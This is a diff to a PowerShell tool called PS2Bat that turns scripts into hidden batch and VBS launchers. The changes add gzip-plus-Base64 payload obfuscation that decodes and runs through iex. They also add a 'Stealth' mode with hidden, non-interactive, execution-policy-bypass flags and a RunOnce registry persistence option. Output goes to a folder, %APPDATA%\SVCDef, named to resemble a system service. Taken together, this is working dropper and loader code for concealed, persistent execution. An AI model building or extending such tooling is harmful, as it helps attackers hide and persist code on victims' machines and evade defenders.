@@ -1,7 +1,7 @@
 # PS2Bat - Advanced PowerShell to Batch Converter
 # Converts PowerShell scripts to hidden batch launchers with enhanced features
 # Author: Enhanced Version
-# Version: 2.0
+# Version: 2.1
 
 param(
     [Parameter(Position=0, HelpMessage="Path or pattern to PowerShell script(s)")]
@@ -18,6 +18,17 @@ param(
     
     [Parameter(HelpMessage="Custom output directory (default: %APPDATA%\SVCDef)")]
     [string]$OutputDir = "",
+
+    [Parameter(HelpMessage="Payload encoding strategy")]
+    [ValidateSet("Base64", "GzipBase64")]
+    [string]$PayloadEncoding = "Base64",
+
+    [Parameter(HelpMessage="Run behavior for generated launcher")]
+    [ValidateSet("Immediate", "RunOnce", "Both")]
+    [string]$RunMode = "Both",
+
+    [Parameter(HelpMessage="Apply extra stealth flags and noise reduction")]
+    [switch]$Stealth,
     
     [Parameter(HelpMessage="Skip PowerShell syntax validation")]
     [switch]$SkipValidation,
@@ -59,7 +70,7 @@ function Write-Log {
 # Show help information
 function Show-Help {
     Write-Host @"
-PS2Bat - Advanced PowerShell to Batch Converter v2.0
+PS2Bat - Advanced PowerShell to Batch Converter v2.1
 
 USAGE:
     .\ps2bat.ps1 [Filepattern] [Options]
@@ -72,6 +83,9 @@ OPTIONS:
     -Test           Test generated batch files without executing
     -Cleanup        Remove generated files and registry entries
     -OutputDir      Custom output directory (default: %APPDATA%\SVCDef)
+    -PayloadEncoding Payload mode: Base64 or GzipBase64
+    -RunMode        Launcher run mode: Immediate, RunOnce, or Both
+    -Stealth        Add extra hidden/non-interactive launch flags
     -SkipValidation Skip PowerShell syntax validation
     -Help           Show this help information
 
@@ -80,9 +94,10 @@ EXAMPLES:
     .\ps2bat.ps1 "MyScript.ps1" -Test
     .\ps2bat.ps1 -Cleanup
     .\ps2bat.ps1 "Script.ps1" -OutputDir "C:\CustomPath"
+    .\ps2bat.ps1 "Script.ps1" -PayloadEncoding GzipBase64 -Stealth
 
 FEATURES:
-    ✅ Base64 encoding for hidden execution
+    ✅ Multiple payload encoding modes (Base64 and GzipBase64)
     ✅ Automatic file copying to %APPDATA%\SVCDef
     ✅ VBS launcher creation for silent execution
     ✅ RunOnce registry integration
@@ -107,6 +122,39 @@ function Test-PowerShellSyntax {
         Write-Log "PowerShell syntax validation failed: $($_.Exception.Message)" "Error" "Red"
         return $false
     }
+}
+
+# Build encoded launcher command
+function New-LauncherCommand {
+    param(
+        [Parameter(Mandatory)]
+        [string]$ScriptContent,
+        [Parameter(Mandatory)]
+        [ValidateSet("Base64", "GzipBase64")]
+        [string]$EncodingMode
+    )
+
+    if ($EncodingMode -eq "Base64") {
+        return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ScriptContent))
+    }
+
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($ScriptContent)
+    $memoryStream = New-Object System.IO.MemoryStream
+    $gzipStream = New-Object System.IO.Compression.GZipStream($memoryStream, [System.IO.Compression.CompressionMode]::Compress)
+    $gzipStream.Write($bytes, 0, $bytes.Length)
+    $gzipStream.Close()
+    $compressedBase64 = [Convert]::ToBase64String($memoryStream.ToArray())
+    $memoryStream.Dispose()
+
+    $bootstrap = @"
+`$payload = '$compressedBase64';
+`$raw = [Convert]::FromBase64String(`$payload);
+`$ms = New-Object IO.MemoryStream(,`$raw);
+`$gz = New-Object IO.Compression.GZipStream(`$ms, [IO.Compression.CompressionMode]::Decompress);
+`$sr = New-Object IO.StreamReader(`$gz, [Text.Encoding]::UTF8);
+iex (`$sr.ReadToEnd());
+"@
+    return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($bootstrap))
 }
 
 # Cleanup function
@@ -214,8 +262,8 @@ function Convert-PowerShellToBatch {
             # Read and encode the PowerShell script
             Write-Log "Reading and encoding PowerShell script..." "Verbose" "Gray"
             $scriptContent = Get-Content -Path $Path -Raw -Encoding UTF8
-            $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($scriptContent))
-            Write-Log "Script encoded successfully (Length: $($encoded.Length) characters)" "Success" "Green"
+            $encoded = New-LauncherCommand -ScriptContent $scriptContent -EncodingMode $PayloadEncoding
+            Write-Log "Script encoded successfully using $PayloadEncoding (Length: $($encoded.Length) characters)" "Success" "Green"
             
             # Create file paths
             $fileName = [Io.Path]::GetFileNameWithoutExtension($Path)
@@ -225,6 +273,11 @@ function Convert-PowerShellToBatch {
             $copiedBatPath = Join-Path $vbsDir "$fileName.bat"
             $regKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"
             $regName = "SVCDef_$fileName"
+            $psFlags = if ($Stealth) {
+                "-NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden"
+            } else {
+                "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden"
+            }
 
             Write-Log "Generated file paths:" "Verbose" "Gray"
             Write-Log "  Batch file: $batPath" "Verbose" "Gray"
@@ -244,18 +297,29 @@ if not exist "%APPDATA%\SVCDef" mkdir "%APPDATA%\SVCDef" 2>nul
 
 :: Create VBS file with embedded PowerShell command
 echo Set WShell = CreateObject("WScript.Shell") > "%VBSPath%"
-echo WShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encoded", 0, True >> "%VBSPath%"
+echo WShell.Run "powershell.exe $psFlags -EncodedCommand $encoded", 0, False >> "%VBSPath%"
+"@
 
+            if ($RunMode -in @("RunOnce", "Both")) {
+                $batContent += @"
 :: Add VBS to RunOnce registry for next login execution
 reg add "%RegKey%" /v "%RegName%" /t REG_SZ /d "wscript.exe \"%VBSPath%\"" /f >nul 2>&1
+"@
+            }
 
+            if ($RunMode -in @("Immediate", "Both")) {
+                $batContent += @"
 :: Run VBS immediately for current session
 wscript.exe "%VBSPath%"
+"@
+            }
 
+            if ($RunMode -eq "Both") {
+                $batContent += @"
 :: Clean up registry entry after execution
 reg delete "%RegKey%" /v "%RegName%" /f >nul 2>&1
 "@
-
+            }
             # Write batch file
             Write-Log "Creating batch file: $batPath" "Info" "Cyan"
             Set-Content -Path $batPath -Value $batContent -Encoding Ascii
